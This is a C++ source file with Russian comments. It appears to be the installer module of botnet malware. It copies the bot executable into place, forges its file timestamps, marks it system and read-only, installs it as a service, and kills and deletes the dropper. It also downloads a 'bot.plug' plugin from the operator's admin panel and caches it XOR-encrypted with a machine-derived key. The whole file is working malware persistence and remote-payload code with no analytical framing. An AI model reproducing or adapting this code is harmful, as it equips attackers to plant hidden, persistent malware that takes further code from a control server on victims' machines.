
//****************************************************************************
//  Installer.cpp
//
//  Модуль реализации методов инсталяции бота
//
//  ВерсияЖ 1.0
//  Модифицирован: ноябрь 2012
//****************************************************************************

#include <ShlObj.h>
#include "Installer.h"
#include "BotCore.h"
#include "StrConsts.h"
#include "BotClasses.h"
#include "BotUtils.h"
#include "Plugins.h"
#include "Crypt.h"

//---------------------------------------------------------------------------
#include "BotDebug.h"

namespace INSTALLERDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define INSTDBG INSTALLERDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------


//----------------------------------------------------
//  Install - Функция инсталирует бота
//
//  IsUpdate - Признак того, что идёт обновление бота
//             а не первая инсталяция
//
//  DeleteSourceFile - Удалять ли исходный файл
//
//  SourceFileProcessPID - PID процесса, котрый
//                         необходимо завершить перед
//                         удалением исходного файла
//----------------------------------------------------
BOOL WINAPI Install(const char* FileName, BOOL IsUpdate, BOOL DeleteSourceFile, DWORD SourceFileProcessPID)

{

	if (!File::IsExists((PCHAR)FileName))
		return FALSE;

	string BotFile = BOT::GetBotFullExeName();

	// Проверяем не пытаемся ли мы запустить инсталяцию из
	// самого себя
	if (StrSame((PCHAR)FileName, BotFile.t_str(), false, 0))
		return FALSE;

	INSTDBG("Installer", "Инсталируем бот. Exe бота %s", BotFile.t_str());

	// Снимаем защиту и удаляем файл
	if (IsUpdate) BOT::Unprotect();
	BOT::DeleteBotFile(BotFile.t_str(), INFINITE, false);

	//  Копируем файл
	BOOL Result = (BOOL)pCopyFileA(FileName, BotFile.t_str(), TRUE);
	INSTDBG("Installer", "Копируем файл бота. [Result=%d; Err=%d]", Result, pGetLastError());

	if (Result)
	{
		// Устанавливаем дату и атрибуты файла
		SetFakeFileDateTime(BotFile.t_str());
		pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
    }

	// Инсталируем сервис
	if (IsUpdate)
	{
		// Обновляем сервис
		// В случае неудачи пытаемся установить сервис заново
		if (!BOT::UpdateService(FileName))
			BOT::InstallService(FileName);
	}
	else
		BOT::InstallService(FileName);


	// Ставим защиту на ехе бота
	if (IsUpdate) BOT::Protect(NULL);

	// Удаляем файл источник
	if (DeleteSourceFile)
	{
		DWORD Start = (DWORD)pGetTickCount();

		while ((DWORD)pGetTickCount() - Start < 5000)
		{
			if (SourceFileProcessPID)
				pWinStationTerminateProcess(NULL, SourceFileProcessPID, DBG_TERMINATE_PROCESS);

			pSetFileAttributesA(FileName, FILE_ATTRIBUTE_ARCHIVE );
			BOOL Deleted = (BOOL)pDeleteFileA(FileName);
			if (Deleted || pGetLastError() != 5) break;
			pSleep(50);
        }
	}
	
	INSTDBG("Installer", "Установка бота завершена. [Result=%d]", Result);

	return Result != FALSE;
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  MakeUpdate - функция обновляет бота
//----------------------------------------------------
bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
{
	// При необходимости удалем сохранённые настройки
	if (ResetSettings)
		DeleteSettings();

	return Install(FileName, true, true, 0) == TRUE;
}






//**************************************************************
//        Методы для работы с плагином бота bot.plug
//**************************************************************


//----------------------------------------------
//  GetBotPlugFileName - Функция возвращает имя
//  файла, для хранения плагина
//----------------------------------------------
string GetBotPlugFileName()
{
    return BOT::MakeFileName(NULL, GetStr(EStrBotPlug).t_str());
}


//----------------------------------------------
//  LoadBotPlug - Функция загружает плагин
//
//  Если плагин есть на диске, то он загружается
//  с диска. В противном случае плагин загру-
//  жается с админки и промежуточно сохраняется
//  на диске
//----------------------------------------------
BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize)
{
	if (BufSize) *BufSize = 0;

	if (!Buf) return FALSE;
	*Buf = NULL;

	// Пытаемся загрузить плагин из файла
	string FileName = GetBotPlugFileName();

	DWORD  FileSize = 0;
	LPBYTE FileData = File::ReadToBufferA(FileName.t_str(), FileSize);
	if (FileData)
	{
		// Файл есть на диске, дешифруем буфер и возвращаем значение

		// Расшифровываем ботплаг
		CryptBotPlug(FileData, FileSize);

		// Проверяем результат
		BOOL Valid = IsExecutableFile(FileData);

		if (Valid)
		{
			// Всё удачно расшифровано, возвращаем результат
			*Buf = FileData;
			if (BufSize) *BufSize = FileSize;
			return TRUE;
		}
		else
		{
			// Буфер повреждён, удаляем файл
			MemFree(FileData);
			pDeleteFileA(FileName.t_str());
        }
	}


	// Загружаем плагин
	FileData = Plugin::DownloadEx(GetStr(EStrBotPlug).t_str(), NULL, &FileSize, true, false, NULL);
	if (!FileData) return FALSE;

	// кэшируем файл
	LPBYTE CacheBuf = (LPBYTE)MemAlloc(FileSize);
	m_memcpy(CacheBuf, FileData, FileSize);
	if (CryptBotPlug(CacheBuf, FileSize))
	{
		File::WriteBufferA(FileName.t_str(), CacheBuf, FileSize);
	}
	MemFree(CacheBuf);

	// Возвращаем результат
	*Buf = FileData;
	if (BufSize) *BufSize = FileSize;

	return TRUE;
}


//----------------------------------------------
//  UpdateBotPlug - Функция обновляет плагин
//----------------------------------------------
BOOL WINAPI UpdateBotPlug()
{
	string FileName = GetBotPlugFileName();
	DeleteFileA(FileName.t_str());
	DWORD Sz;
	LPVOID Buf;
	if (LoadBotPlug(&Buf, &Sz))
	{
        MemFree(Buf);
        return TRUE;
    }

	return FALSE;
}



//----------------------------------------------
//  FreeBotPlug - Функция освобождает память
//                выделенную под плагин
//
//  Добавлено для dll ядра
//----------------------------------------------
VOID WINAPI FreeBotPlug(LPVOID Buf)
{
    MemFree(Buf);
}


//----------------------------------------------
//  CryptBotPlug - Функция шифрует/дешифрует
//                 плагина бота
//----------------------------------------------
BOOL WINAPI CryptBotPlug(LPVOID Buf, DWORD BufSize)
{
	if (!Buf || !BufSize) return FALSE;

	// Получаем пароль
	PCHAR Pass = MakeMachineID();
	if (!Pass) return FALSE;

    XORCrypt::Crypt(Pass, (LPBYTE)Buf, BufSize);

	STR::Free(Pass);
	return TRUE;
}
